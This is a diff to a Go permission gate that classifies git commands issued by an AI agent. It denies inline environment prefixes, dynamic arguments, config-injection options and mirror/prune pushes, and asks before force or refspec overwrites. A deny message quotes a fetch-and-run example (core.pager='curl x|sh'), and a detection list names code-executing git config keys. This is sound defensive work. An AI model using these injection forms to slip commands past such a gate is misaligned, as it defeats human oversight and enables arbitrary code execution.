@@ -76,15 +76,62 @@ func classifySimpleCommand(sc simpleCommand, ev *Event) Decision {
 	return deferToPipeline()
 }
 
+// preconditionDeny applies the #64 precondition shared by the git/gh/aws
+// classifiers BEFORE any per-command logic: every word of the command must be a
+// static literal (no command substitution / unresolved parameter expansion /
+// glob), and there must be no inline environment-assignment prefix. Either
+// shape can reach a dangerous outcome without the flags the policy keys on
+// (`AWS_ENDPOINT_URL=… aws …` redirects egress; `git $OP` hides the
+// subcommand), so a hit DENYs rather than allowing. Returns the deny Decision
+// and true on a hit; the zero Decision and false otherwise.
+//
+// Per the #64 resolved design decisions, these classifiers never defer:
+// callers must convert this into a concrete DENY here rather than handing a
+// non-static command back to the pipeline.
+func preconditionDeny(tool string, sc simpleCommand) (Decision, bool) {
+	if sc.hasInlineAssignment {
+		return deny(tool+" inline-env-assignment (#64)",
+			"Blocked: an inline environment-assignment prefix on '"+tool+"' (e.g. "+
+				"AWS_ENDPOINT_URL=…, GIT_SSH_COMMAND=…, GH_HOST=…, AWS_PAGER=…) can redirect egress, "+
+				"swap identity, or inject a pager without touching the command's arguments. "+
+				"Remove the inline assignment; if the variable is genuinely needed, surface it to the human."), true
+	}
+	if sc.hasUnknownExpansion {
+		return deny(tool+" non-static-argv (#64)",
+			"Blocked: a '"+tool+"' command whose arguments are not all static literals "+
+				"(a command substitution, unresolved variable, or glob) cannot be statically classified and "+
+				"could reach a dangerous operation through the dynamic token. Run the command with literal "+
+				"arguments instead, so the gate can classify it."), true
+	}
+	return Decision{}, false
+}
+
 // classifyGit parses git's option grammar from the AST tokens: global options
 // (`--no-pager`/`-P`, `-c k=v`, `-C path`, `--git-dir`, etc.) precede the
 // subcommand (#13). Positional guessing is obsolete — we consume globals
 // explicitly, then dispatch on the real subcommand.
+//
+// Per the #64 resolved design decisions this classifier NEVER defers: the
+// catch-all for a recognized git subcommand is ALLOW (containment lives in the
+// microVM), with the deny/ask tiers below carving out the dangerous shapes.
 func classifyGit(args []string, sc simpleCommand, ev *Event) Decision {
+	// #64 precondition: static argv + no inline env-assignment, gated FIRST.
+	if d, hit := preconditionDeny("git", sc); hit {
+		return d
+	}
+
+	// #64 bypass gate 3: `git -c …` / config-injection RCE. Scan the global
+	// options screen BEFORE the subcommand is classified — these execute
+	// arbitrary commands regardless of the subcommand.
+	if d, hit := gitGlobalRCEDeny(args); hit {
+		return d
+	}
+
 	sub, rest, cdir := parseGitGlobals(args)
 	if sub == "" {
-		// `git` with only globals / no subcommand — defer.
-		return deferToPipeline()
+		// `git` with only globals / no subcommand — nothing dangerous and
+		// nothing to run; ALLOW (the gate has no objection).
+		return allow("git with no subcommand")
 	}
 
 	// If a `-C <path>` global was given, that path is the git context for
@@ -98,6 +145,13 @@ func classifyGit(args []string, sc simpleCommand, ev *Event) Decision {
 		if d, hit := gitConfigIdentityRule(rest); hit {
 			return d
 		}
+	}
+
+	// #64 bypass gate 2 + push rules: classify `git push` on its refspec, not
+	// just its flags. A `:`-bearing or empty-source refspec, --mirror/--prune,
+	// and --force all reach delete/overwrite outcomes.
+	if sub == "push" {
+		return classifyGitPush(rest)
 	}
 
 	// #120: subagent `git reset --hard`.
@@ -117,21 +171,184 @@ func classifyGit(args []string, sc simpleCommand, ev *Event) Decision {
 				"then 'git checkout --detach origin/<branch>'.")
 	}
 
-	// --- ALLOW rules: read-only / non-mutating git subcommands ---
-	if gitReadOnlySubcommands[sub] {
-		if !sc.allowEligible() {
-			return deferToPipeline()
+	// --- ALLOW default (#64): every recognized git subcommand that is not a
+	// dangerous shape carved out above falls through to ALLOW. Read-only
+	// subcommands and ordinary mutations (commit, add, fetch, …) alike are
+	// allowed; containment lives in the microVM. A real-file redirect is the
+	// one residual exfil concern the gate still escalates — it cannot defer
+	// here (#64 decision 2), so it ASKs rather than auto-allowing.
+	if sc.hasRedirectToFile {
+		return ask("git redirect-to-file",
+			"'git' with stdout/stderr redirected to a real file can exfiltrate or clobber. "+
+				"Confirm the redirect target is intended.")
+	}
+	return allow(fmt.Sprintf("git %s is not a guarded dangerous operation", sub))
+}
+
+// gitGlobalRCEDeny scans git's pre-subcommand global-options screen for the
+// config-injection / arbitrary-command-execution forms (#64 bypass gate 3):
+// `-c <key>=<value>` whose key is a code-executing config knob (core.pager,
+// core.sshCommand, core.fsmonitor, core.editor, alias.*, diff.external,
+// *.textconv, *.command, sequence.editor, …), `--config-env`, and
+// `--exec-path=<dir>`. Any hit DENYs. A bare `--exec-path` (no `=`, the query
+// form that prints git's exec path) is left alone.
+//
+// Default-deny within the gate: an unrecognized `-c key=value` whose key COULD
+// execute code is denied. We allow a conservative allowlist of inert display
+// knobs (color.*, core.pager=cat is still denied because pager values run a
+// shell) and deny the rest of `-c`, because the cost of a false deny is one
+// human click while a false allow is arbitrary code execution (#64 principle 3).
+func gitGlobalRCEDeny(args []string) (Decision, bool) {
+	rceDeny := func() (Decision, bool) {
+		return deny("git -c config-injection RCE (#64)",
+			"Blocked: a 'git -c <key>=<value>' / '--config-env' / '--exec-path=<dir>' global option can execute "+
+				"arbitrary commands (e.g. -c core.pager='curl x|sh', -c core.sshCommand=…, -c diff.external=…, "+
+				"-c alias.*). These defeat any read-only classification. Run git without the config-injection global; "+
+				"if a config value is genuinely needed, set it in the repo's own config deliberately, not inline."), true
+	}
+	for i := 0; i < len(args); i++ {
+		a := args[i]
+		// Stop scanning at the first non-option token (the subcommand) — git
+		// globals only precede the subcommand.
+		if !strings.HasPrefix(a, "-") {
+			break
 		}
-		// `git config` with a write (key + value) is NOT read-only; only the
-		// list/get forms are. gitReadOnlySubcommands excludes "config", so we
-		// never land here for config.
-		return allow(fmt.Sprintf("git %s is a read-only / non-mutating subcommand", sub))
+		switch {
+		case a == "-c":
+			if i+1 < len(args) {
+				if gitConfigKeyExecutesCode(args[i+1]) {
+					return rceDeny()
+				}
+				i++ // consume the value
+			}
+		case strings.HasPrefix(a, "-c") && len(a) > 2:
+			if gitConfigKeyExecutesCode(strings.TrimPrefix(a, "-c")) {
+				return rceDeny()
+			}
+		case a == "--config-env" || strings.HasPrefix(a, "--config-env="):
+			return rceDeny()
+		case strings.HasPrefix(a, "--exec-path="):
+			return rceDeny()
+		}
+	}
+	return Decision{}, false
+}
+
+// gitConfigKeyExecutesCode reports whether a `-c key=value` config setting can
+// execute an external command. Default-deny: a key whose VALUE is interpreted
+// as (or names) a command is denied. The match is on the config key (the part
+// before the first `=`), case-insensitively, and covers both exact keys and
+// suffix patterns (`*.textconv`, `*.command`, `alias.*`).
+func gitConfigKeyExecutesCode(kv string) bool {
+	key := kv
+	if eq := strings.IndexByte(kv, '='); eq >= 0 {
+		key = kv[:eq]
+	}
+	key = strings.ToLower(key)
+	// Exact code-executing keys.
+	switch key {
+	case "core.pager", "core.sshcommand", "core.fsmonitor", "core.editor",
+		"core.hookspath", "sequence.editor", "diff.external", "gpg.program",
+		"gpg.ssh.program", "pager.diff", "pager.log", "pager.show", "filter.lfs.process":
+		return true
+	}
+	// Suffix / namespace patterns that name or run a command.
+	if strings.HasPrefix(key, "alias.") ||
+		strings.HasSuffix(key, ".textconv") ||
+		strings.HasSuffix(key, ".command") ||
+		strings.HasSuffix(key, ".process") ||
+		strings.HasSuffix(key, ".smudge") ||
+		strings.HasSuffix(key, ".clean") ||
+		strings.HasPrefix(key, "pager.") ||
+		strings.HasPrefix(key, "difftool.") ||
+		strings.HasPrefix(key, "mergetool.") {
+		return true
+	}
+	return false
+}
+
+// classifyGitPush classifies `git push` arguments (#64 bypass gate 2 + the push
+// rules). rest is the args after the `push` subcommand token. The refspec — not
+// just the flags — is classified: a refspec containing `:` (delete/overwrite)
+// or whose source is empty (`:branch`, a delete) reaches a delete/overwrite
+// outcome WITHOUT the `--delete` flag the naive policy keys on.
+//
+// DENY:  --mirror, --prune (delete every remote ref absent from local).
+// ASK:   plain --force / -f (overwrites the ref).
+// ALLOW: --force-with-lease (own-race protection), a clean named-branch delete
+//
+//	(--delete <branch> or origin :branch), tag deletion, and an
+//	ordinary fast-forward push.
+//
+// Default within the gate: an arbitrary `:`-bearing refspec that is not a clean
+// named-branch delete ASKs (it overwrites a remote ref). Never defers (#64).
+func classifyGitPush(rest []string) Decision {
+	// Collect flags and positional (non-flag) operands separately.
+	var positionals []string
+	hasForce := false
+	hasForceWithLease := false
+	for _, a := range rest {
+		switch {
+		case a == "--mirror":
+			return deny("git push --mirror (#64)",
+				"Blocked: 'git push --mirror' deletes every remote ref that is absent locally — "+
+					"an irreparable bulk overwrite/delete of the remote. Push specific branches instead.")
+		case a == "--prune":
+			return deny("git push --prune (#64)",
+				"Blocked: 'git push --prune' deletes every remote ref under the pushed refspec that is absent "+
+					"locally. This can irreparably delete remote branches. Push specific branches without --prune.")
+		case a == "--force" || a == "-f":
+			hasForce = true
+		case a == "--force-with-lease" || strings.HasPrefix(a, "--force-with-lease=") ||
+			a == "--force-if-includes":
+			hasForceWithLease = true
+		case a == "--delete" || a == "-d":
+			// A clean named-branch delete is recoverable (Restore-branch /
+			// re-push) → ALLOW default; no special handling needed.
+		case strings.HasPrefix(a, "-"):
+			// Other flags (e.g. --tags, -u, --set-upstream, --no-verify) are not
+			// dangerous shapes on their own; ignore for classification.
+		default:
+			positionals = append(positionals, a)
+		}
 	}
 
-	// Everything else (push, rebase, merge, clean, ...) — defer to the
-	// normal pipeline, which has explicit ask/deny entries for the
-	// destructive ones.
-	return deferToPipeline()
+	// Refspec inspection: positionals are [remote] [refspec...]. A refspec
+	// containing ':' is a source:dest mapping; an empty source ('') is a delete.
+	for _, p := range positionals {
+		colon := strings.IndexByte(p, ':')
+		if colon < 0 {
+			continue // a plain ref / remote name — not a colon-refspec.
+		}
+		src := p[:colon]
+		if src == "" {
+			// ':branch' — a delete of the destination ref. The Restore-branch
+			// button / re-push recovers it, so a clean named-branch delete is
+			// ALLOW per the spec, but a delete is still a remote mutation the
+			// --delete-flag path treats as allow; keep it ALLOW here.
+			continue
+		}
+		// 'src:dest' (or 'sha:branch') overwrites the destination ref WITHOUT a
+		// --delete flag. This is the bypass §2 shape: route to ASK (overwrite),
+		// unless it is the own-race-protected force-with-lease.
+		if hasForceWithLease {
+			continue
+		}
+		return ask("git push arbitrary-refspec (#64)",
+			"'git push' with an explicit source:dest refspec (e.g. 'origin local:refs/heads/x', "+
+				"'origin <sha>:branch') overwrites a remote ref without the --force flag the policy keys on. "+
+				"Confirm this overwrite is intended; prefer --force-with-lease for race protection.")
+	}
+
+	if hasForce && !hasForceWithLease {
+		return ask("git push --force (#64)",
+			"'git push --force' overwrites the remote ref and, if nobody captured the prior SHA, degrades to "+
+				"irreparable. Confirm this is intended. Prefer 'git push --force-with-lease' for race protection.")
+	}
+
+	// --force-with-lease, --delete <branch>, tag deletion, and an ordinary
+	// fast-forward push are all recoverable / small units of work → ALLOW.
+	return allow("git push (non-dangerous form)")
 }
 
 // parseGitGlobals consumes git's pre-subcommand global options and returns the
